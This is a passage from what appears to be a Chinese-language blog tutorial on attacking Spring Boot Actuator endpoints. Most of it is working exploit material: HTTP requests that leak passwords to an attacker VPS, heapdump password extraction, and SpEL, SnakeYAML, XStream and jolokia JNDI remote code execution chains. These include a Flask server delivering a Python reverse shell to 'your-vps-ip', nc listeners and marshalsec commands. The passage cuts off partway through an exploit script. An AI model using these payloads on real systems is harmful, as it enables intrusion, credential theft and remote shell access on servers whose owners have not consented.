2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/?=$&#123;security.user.password&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><p>测试：</p><p><img src="https://s2.loli.net/2022/06/26/ofE6mMjHDyNekWT.png" alt="image-20220626015657074"></p><p>请求<code>/refresh</code>接口，vps接收到外带的请求，成功带出属性值</p><p><img src="https://s2.loli.net/2022/06/26/PUinxFDRgQhsj9y.png" alt="image-20220626020436695"></p><ul><li><code>eureka.client.serviceUrl.defaultZone</code> 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）</li></ul><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://your-vps-ip/$&#123;security.user.password&#125;</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/$&#123;security.user.password&#125;&quot;&#125;</span><br></pre></td></tr></table></figure><p>测试：</p><p><img src="https://s2.loli.net/2022/06/26/apT6Jh7bqymHRUK.png" alt="image-20220626015730753"></p><p>vps监听到请求</p><p><img src="https://s2.loli.net/2022/06/26/dTAgUN2tVWZsxXP.png" alt="image-20220626015708272"></p><p>如果读取的属性值中存在特殊字符时，可能会出现读取不全的情况，如下：</p><p><img src="https://s2.loli.net/2022/06/26/hzrHQXGCo9vdmIL.png" alt="image-20220626015803160"></p><p>实际设置的密码是</p><p><img src="https://s2.loli.net/2022/06/26/yjEVJrzs7Ti9MGd.png" alt="image-20220626020549710"></p><p>步骤四：刷新配置</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><h5 id="方法四"><a href="#方法四" class="headerlink" title="方法四"></a>方法四</h5><p>利用条件：</p><ul><li>可正常 GET 请求目标 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口</li></ul><p>利用方法：</p><p>步骤一：找到想要获取的属性名</p><p>步骤二：下载 jvm heap 信息</p><blockquote><p>下载的 heapdump 文件大小通常在 50M—500M 之间</p></blockquote><p>步骤三：使用 MAT 获得 jvm heap中的密码明文</p><ul><li>使用 <a href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具的 <strong>OQL</strong> 语句</li></ul><p>通过查询如下语法，获取heapdump文件中所有包含”password”属性的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure><ul><li>还可以采用  <a href="https://github.com/wyzxxz/heapdump_tool">heapdump_tool</a>  命令行方式一键查询，更加方便</li></ul><h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><h4 id="whitelabel-error-page-SpEL-RCE"><a href="#whitelabel-error-page-SpEL-RCE" class="headerlink" title="whitelabel error page SpEL RCE"></a>whitelabel error page SpEL RCE</h4><p>利用条件：</p><ul><li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li><li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li></ul><p>利用方法：</p><p>步骤一：找到一个正常传参处</p><p>比如发现访问 <code>/article?id=xxx</code> ，页面会报状态码为 500 的错误： <code>Whitelabel Error Page</code>。</p><p>步骤二：执行SpEL表达式</p><p>输入 <code>/article?id=$&#123;7*7&#125;</code> ，如果发现报错页面将 7*7 的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p><p>为了方便执行java代码，先将字符串格式转换成<code>0x**</code> java 字节形式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;calc&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;,&quot;</span></span><br><span class="line"><span class="built_in">print</span>(result.rstrip(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure><p>执行 <code>calc</code> 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x63,0x61,0x6c,0x63&#125;))&#125;</span><br></pre></td></tr></table></figure><p>测试结果如下：</p><p><img src="https://s2.loli.net/2022/06/26/wjI7TEsmuv6Pyip.png" alt="image-20220626020617831"></p><p>漏洞原理：</p><ol><li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li><li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li><li>其中 <code>$&#123;&#125;</code> 包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li></ol><h4 id="spring-cloud-SnakeYAML-RCE"><a href="#spring-cloud-SnakeYAML-RCE" class="headerlink" title="spring cloud SnakeYAML RCE"></a>spring cloud SnakeYAML RCE</h4><p>利用条件：</p><ul><li>可以 POST 请求目标网站 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><p>利用方法：</p><p>步骤一：托管 yml 和 jar文件</p><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer <span class="number">80</span></span><br><span class="line">python3 -m http.server <span class="number">80</span></span><br></pre></td></tr></table></figure><p>在网站根目录下放置后缀为 <code>yml</code> 的文件 <code>example.yml</code>，内容如下：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!javax.script.ScriptEngineManager</span> [</span><br><span class="line">  <span class="type">!!java.net.URLClassLoader</span> [[</span><br><span class="line">    <span class="type">!!java.net.URL</span> [<span class="string">&quot;http://your-vps-ip/example.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>在网站根目录下放置后缀为 <code>jar</code> 的文件 <code>example.jar</code>，内容是要执行的代码，代码编写及编译方式参考 <a href="https://github.com/artsploit/yaml-payload">yaml-payload</a>。</p><p>步骤二：设置 <code>spring.cloud.bootstrap.location</code> 属性</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip/example.yml</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;&#125;</span><br></pre></td></tr></table></figure><p>步骤三：刷新配置</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p>测试：</p><p>POST设置属性</p><p><img src="https://s2.loli.net/2022/06/26/vbYZOWCuUTfIoeG.png" alt="image-20220626020637203"></p><p>vps监听80端口，刷新配置-请求 <code>/refresh</code> 接口，即可触发RCE</p><p><img src="https://s2.loli.net/2022/06/26/NYBjaivS7VhMD12.png" alt="image-20220626020650368"></p><p><img src="https://s2.loli.net/2022/06/26/4iUmsAfW2VjP5H1.png" alt="image-20220626020853440"></p><p>漏洞原理：</p><ol><li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li><li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li><li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li><li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li><li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li><li>实例化类时执行恶意代码，造成 RCE 漏洞</li></ol><h4 id="eureka-xstream-deserialization-RCE"><a href="#eureka-xstream-deserialization-RCE" class="headerlink" title="eureka xstream deserialization RCE"></a>eureka xstream deserialization RCE</h4><p>利用条件：</p><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标使用的 <code>eureka-client</code> &lt; 1.8.7（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li></ul><p>步骤一：架设响应恶意XStream payload网站</p><p>提供一个依赖 Flask 并符合要求的python脚本，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p><p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p><blockquote><p> <command><string>command</string></command>，标签中编写要执行的命令即可</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># -**- Author: LandGrey -**-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, defaults=&#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span>)</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&lt;path:path&gt;&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">catch_all</span>(<span class="params">path</span>):</span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;&lt;linked-hash-set&gt;</span></span><br><span class="line"><span class="string">  &lt;jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;dataHandler&gt;</span></span><br><span class="line"><span class="string">        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</span></span><br><span class="line"><span class="string">                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;command&gt;</span></span><br><span class="line"><span class="string">                       &lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                       &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                       &lt;string&gt;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your-vps-ip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;&lt;/string&gt;</span></span><br><span class="line"><span class="string">                    &lt;/command&gt;</span></span><br><span class="line"><span class="string">                &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</span></span><br><span class="line"><span class="string">                  &lt;/next&gt;</span></span><br><span class="line"><span class="string">                &lt;/iter&gt;</span></span><br><span class="line"><span class="string">                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;method&gt;</span></span><br><span class="line"><span class="string">                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</span></span><br><span class="line"><span class="string">                    &lt;name&gt;start&lt;/name&gt;</span></span><br><span class="line"><span class="string">                    &lt;parameter-types/&gt;</span></span><br><span class="line"><span class="string">                  &lt;/method&gt;</span></span><br><span class="line"><span class="string">                  &lt;name&gt;foo&lt;/name&gt;</span></span><br><span class="line"><span class="string">                &lt;/filter&gt;</span></span><br><span class="line"><span class="string">                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</span></span><br><span class="line"><span class="string">              &lt;/serviceIterator&gt;</span></span><br><span class="line"><span class="string">              &lt;lock/&gt;</span></span><br><span class="line"><span class="string">            &lt;/cipher&gt;</span></span><br><span class="line"><span class="string">            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;ibuffer&gt;&lt;/ibuffer&gt;</span></span><br><span class="line"><span class="string">          &lt;/is&gt;</span></span><br><span class="line"><span class="string">        &lt;/dataSource&gt;</span></span><br><span class="line"><span class="string">      &lt;/dataHandler&gt;</span></span><br><span class="line"><span class="string">    &lt;/value&gt;</span></span><br><span class="line"><span class="string">  &lt;/jdk.nashorn.internal.objects.NativeString&gt;</span></span><br><span class="line"><span class="string">&lt;/linked-hash-set&gt;&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> Response(xml, mimetype=<span class="string">&#x27;application/xml&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>步骤二：监听反弹shell的端口</p><p>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;&#125;</span><br></pre></td></tr></table></figure><p>步骤四：刷新配置</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p>测试：</p><p>POST设置属性值</p><p><img src="https://s2.loli.net/2022/06/26/3sv71X6NEyZuaK5.png" alt="image-20220626021217346"></p><p>vps上运行python脚本</p><p><img src="https://s2.loli.net/2022/06/26/5ySDI1OhU4vLpdP.png" alt="image-20220626021321200"></p><p>这里测试弹出计算器成功</p><p><img src="https://s2.loli.net/2022/06/26/hAPJgHyWwGFRCVj.png" alt="image-20220626021352878"></p><h4 id="jolokia-logback-JNDI-RCE"><a href="#jolokia-logback-JNDI-RCE" class="headerlink" title="jolokia logback JNDI RCE"></a>jolokia logback JNDI RCE</h4><p>利用条件：</p><ul><li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li><li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li><li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</li></ul><p>利用方法：</p><p>步骤一：查看已存在的 MBeans</p><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词。</p><p>步骤二：托管 xml 文件</p><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在根目录放置以 <code>xml</code> 结尾的 <code>example.xml</code> 文件，内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">insertFromJNDI</span> <span class="attr">env-entry-name</span>=<span class="string">&quot;ldap://your-vps-ip:1389/JNDIObject&quot;</span> <span class="attr">as</span>=<span class="string">&quot;appName&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>步骤三：准备要执行的 Java 代码</p><p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a> <code>JNDIObject.java</code>，</p><p>使用兼容低版本 jdk 的方式编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -source 1.5 -target 1.5 JNDIObject.java</span><br></pre></td></tr></table></figure><p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p><p>步骤四：架设恶意 ldap 服务</p><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389</span><br></pre></td></tr></table></figure><p>步骤五：监听反弹 shell 的端口</p><p>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lv 443</span><br></pre></td></tr></table></figure><p>步骤六：从外部 URL 地址加载日志配置文件</p><blockquote><p>⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p></blockquote><p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml</span><br></pre></td></tr></table></figure><p>测试：</p><p>访问URL</p><p><img src="https://s2.loli.net/2022/06/26/gEFH3WvIuZCTJoM.png" alt="image-20220626021601495"></p><p>HTTP 服务看到请求记录</p><p><img src="https://s2.loli.net/2022/06/26/dTlEHXMhZsBGzoF.png" alt="image-20220626021543950"></p><p>marshalsec 也接收到了目标请求</p><p><img src="https://s2.loli.net/2022/06/26/U872JSnuCvNfrs3.png" alt="image-20220626021619867"></p><p>漏洞原理：</p><ol><li>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 类的 <code>reloadByURL</code> 方法</li><li>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</li><li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li><li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li><li>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li></ol><h4 id="jolokia-Realm-JNDI-RCE"><a href="#jolokia-Realm-JNDI-RCE" class="headerlink" title="jolokia Realm JNDI RCE"></a>jolokia Realm JNDI RCE</h4><p>利用条件：</p><ul><li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li><li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li><li>目标可以请求攻击者的服务器（请求可出外网）</li><li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141&#x2F;7u131&#x2F;8u121(RMI)，但相关环境可绕过</li></ul><p>利用方法：</p><p>步骤一：查看已存在的 MBeans</p><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>type=MBeanFactory</code> 和 <code>createJNDIRealm</code> 关键词。</p><p>步骤二：准备要执行的 Java 代码</p><p>编写优化过后的用来反弹 shell 的java代码<code>JNDIObject.java</code>。</p><p>步骤三：托管 class 文件</p><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p><p>步骤四：架设恶意 rmi 服务</p><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 rmi 服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://your-vps-ip:80/#JNDIObject 1389</span><br><span class="line"></span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://42.194.149.25:80/#JNDIObject 1389</span><br></pre></td></tr></table></figure><p>步骤五：监听反弹 shell 的端口</p><p>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 443</span><br></pre></td></tr></table></figure><p>步骤六：发送恶意 payload</p><p>根据实际情况修改 springboot-realm-jndi-rce.py 脚本中的目标地址，RMI 地址、端口等信息，然后在自己控制的服务器上运行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding: 